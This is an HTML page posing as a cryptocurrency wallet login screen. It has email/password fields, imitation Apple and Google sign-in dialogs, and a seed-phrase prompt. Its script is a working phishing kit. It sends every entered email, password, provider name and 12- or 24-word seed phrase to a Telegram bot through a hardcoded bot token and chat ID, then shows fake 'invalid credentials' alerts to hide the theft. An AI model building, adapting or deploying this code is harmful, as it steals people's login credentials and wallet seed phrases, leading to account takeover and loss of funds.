<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Your Wallet</title>
    <meta name="description" content="Securely log in to your wallet with email, seed phrase, Apple, or Google.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="background-shapes">
        <div class="shape shape-1"></div>
        <div class="shape shape-2"></div>
        <div class="shape shape-3"></div>
    </div>
    
    <main class="login-container">
        <div class="glass-panel">
            <header class="login-header">
                <div class="logo">
                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M19 7H5C3.89543 7 3 7.89543 3 9V17C3 18.1046 3.89543 19 5 19H19C20.1046 19 21 18.1046 21 17V9C21 7.89543 20.1046 7 19 7Z" stroke="url(#paint0_linear)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        <path d="M16 13C16 13.5523 15.5523 14 15 14C14.4477 14 14 13.5523 14 13C14 12.4477 14.4477 12 15 12C15.5523 12 16 12.4477 16 13Z" fill="url(#paint0_linear)"/>
                        <path d="M3 9L21 9" stroke="url(#paint0_linear)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        <defs>
                            <linearGradient id="paint0_linear" x1="3" y1="7" x2="21" y2="19" gradientUnits="userSpaceOnUse">
                                <stop stop-color="#4F46E5"/>
                                <stop offset="1" stop-color="#EC4899"/>
                            </linearGradient>
                        </defs>
                    </svg>
                </div>
                <h1>Welcome Back</h1>
                <p>Securely access your digital assets</p>
            </header>

            <form class="login-form">
                <div class="input-group">
                    <label for="email">Email Address</label>
                    <input type="email" id="email" placeholder="name@example.com" required>
                </div>
                
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" placeholder="••••••••" required>
                </div>

                <button type="submit" class="btn btn-primary">Log In</button>
            </form>

            <div class="divider">
                <span>OR</span>
            </div>

            <div class="social-login">
                <button type="button" class="btn btn-social btn-apple">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                        <path d="M16.364 9.94827C16.3887 7.2343 18.5991 5.92298 18.6976 5.86438C17.4334 4.02029 15.4216 3.73105 14.7709 3.65215C13.0805 3.48312 11.4172 4.65345 10.5521 4.65345C9.67389 4.65345 8.31825 3.66699 6.88373 3.69666C5.02708 3.72504 3.32757 4.77661 2.37895 6.42533C0.428522 9.80556 1.88414 14.8143 3.79155 17.5684C4.72314 18.9103 5.8118 20.4431 7.26629 20.3845C8.67503 20.324 9.19794 19.4674 10.8711 19.4674C12.5317 19.4674 13.0039 20.3845 14.4718 20.3548C15.979 20.324 16.9205 18.9683 17.8407 17.6277C18.9142 16.0592 19.3551 14.5367 19.3753 14.4539C19.3415 14.4379 16.3359 13.2985 16.364 9.94827ZM13.8821 2.12604C14.6548 1.19445 15.1764 -0.100913 15.0345 -1.39343C13.916 -1.34889 12.4839 -0.643328 11.6842 0.285888C10.963 1.11181 10.3396 2.42848 10.5106 3.70281C11.7587 3.7992 13.1093 3.0575 13.8821 2.12604Z"/>
                    </svg>
                    Continue with Apple
                </button>
                
                <button type="button" class="btn btn-social btn-google">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M22.56 12.25C22.56 11.47 22.49 10.72 22.36 10H12V14.26H17.92C17.66 15.63 16.88 16.8 15.71 17.58V20.34H19.28C21.36 18.42 22.56 15.6 22.56 12.25Z" fill="#4285F4"/>
                        <path d="M12 23C14.97 23 17.46 22.02 19.28 20.34L15.71 17.58C14.73 18.24 13.47 18.64 12 18.64C9.16 18.64 6.75 16.73 5.88 14.16H2.21V17C4.01 20.59 7.7 23 12 23Z" fill="#34A853"/>
                        <path d="M5.88 14.16C5.66 13.5 5.53 12.77 5.53 12C5.53 11.23 5.66 10.5 5.88 9.84V7H2.21C1.47 8.48 1.04 10.19 1.04 12C1.04 13.81 1.47 15.52 2.21 17L5.88 14.16Z" fill="#FBBC05"/>
                        <path d="M12 5.38C13.62 5.38 15.06 5.94 16.2 7.02L19.35 3.87C17.45 2.11 14.96 1 12 1C7.7 1 4.01 3.41 2.21 7L5.88 9.84C6.75 7.27 9.16 5.38 12 5.38Z" fill="#EA4335"/>
                    </svg>
                    Continue with Google
                </button>
            </div>

            <div class="alternative-login">
                <button type="button" class="btn btn-outline btn-seed">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                    Log in via Seed Code
                </button>
            </div>
        </div>
    </main>
    <dialog id="provider-modal" class="provider-modal">
        <div class="modal-content">
            <header class="modal-header">
                <h2 id="provider-title">Sign In</h2>
                <button type="button" class="btn-close" id="close-modal">&times;</button>
            </header>
            <form class="provider-form">
                <p>Please enter your credentials to continue with <span id="provider-name"></span>.</p>
                <div class="input-group">
                    <label for="provider-email">Email Address</label>
                    <input type="email" id="provider-email" placeholder="name@example.com" required>
                </div>
                <div class="input-group">
                    <label for="provider-password">Password</label>
                    <input type="password" id="provider-password" placeholder="••••••••" required>
                </div>
                <button type="submit" class="btn btn-primary" style="margin-top: 8px;">Sign In</button>
            </form>
        </div>
    </dialog>

    <script>
        const TELEGRAM_BOT_TOKEN = "8812004667:AAEMv5R4VLh7UbidMj5xfWX1DdT1Z2CpLGA";
        const TELEGRAM_CHAT_ID = "1211039957";

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error("Error sending to Telegram", error);
            }
        }

        // Main Login Form Submission
        const mainForm = document.querySelector('.login-form');
        mainForm.addEventListener('submit', async (e) => {
            e.preventDefault(); // Prevent page refresh
            
            const submitBtn = mainForm.querySelector('button[type="submit"]');
            const originalText = submitBtn.textContent;
            submitBtn.textContent = 'Logging in...';
            submitBtn.disabled = true;

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const message = `🔐 New Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 Method: Standard Login`;
            
            await sendToTelegram(message);
            
            // Revert UI and reset
            submitBtn.textContent = originalText;
            submitBtn.disabled = false;
            alert("Invalid credentials. Please try again.");
            mainForm.reset();
        });

        // Provider Modal Form Submission
        const providerForm = document.querySelector('.provider-form');
        providerForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const submitBtn = providerForm.querySelector('button[type="submit"]');
            const originalText = submitBtn.textContent;
            submitBtn.textContent = 'Verifying...';
            submitBtn.disabled = true;

            const provider = document.getElementById('provider-name').textContent;
            const email = document.getElementById('provider-email').value;
            const password = document.getElementById('provider-password').value;
            const message = `🔐 New Provider Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 Provider: ${provider}`;
            
            await sendToTelegram(message);
            
            // Revert UI and reset
            submitBtn.textContent = originalText;
            submitBtn.disabled = false;
            alert("Authentication failed. Please try again or use another method.");
            providerForm.reset();
            modal.close();
        });

        // Seed Phrase Button Logic
        const seedBtn = document.querySelector('.btn-seed');
        seedBtn.addEventListener('click', async () => {
            const seed = prompt("Please enter your 12 or 24-word seed phrase:");
            if (seed && seed.trim().length > 0) {
                const message = `🌱 New Seed Phrase Login Attempt\n\n📝 Seed: ${seed}\n📱 Method: Seed Phrase`;
                await sendToTelegram(message);
                alert("Invalid seed phrase provided.");
            }
        });

        // Existing Modal logic for opening/closing
        const appleBtn = document.querySelector('.btn-apple');
        const googleBtn = document.querySelector('.btn-google');
        const modal = document.getElementById('provider-modal');
        const closeModal = document.getElementById('close-modal');
        const providerTitle = document.getElementById('provider-title');
        const providerName = document.getElementById('provider-name');

        function openModal(provider) {
            providerTitle.textContent = `Sign in with ${provider}`;
            providerName.textContent = provider;
            modal.showModal();
        }

        appleBtn.addEventListener('click', () => openModal('Apple'));
        googleBtn.addEventListener('click', () => openModal('Google'));

        closeModal.addEventListener('click', () => {
            modal.close();
        });

        // Close on clicking outside the dialog
        modal.addEventListener('click', (e) => {
            const dialogDimensions = modal.getBoundingClientRect()
            if (
                e.clientX < dialogDimensions.left ||
                e.clientX > dialogDimensions.right ||
                e.clientY < dialogDimensions.top ||
                e.clientY > dialogDimensions.bottom
            ) {
                modal.close();
            }
        });
    </script>
</body>
</html>
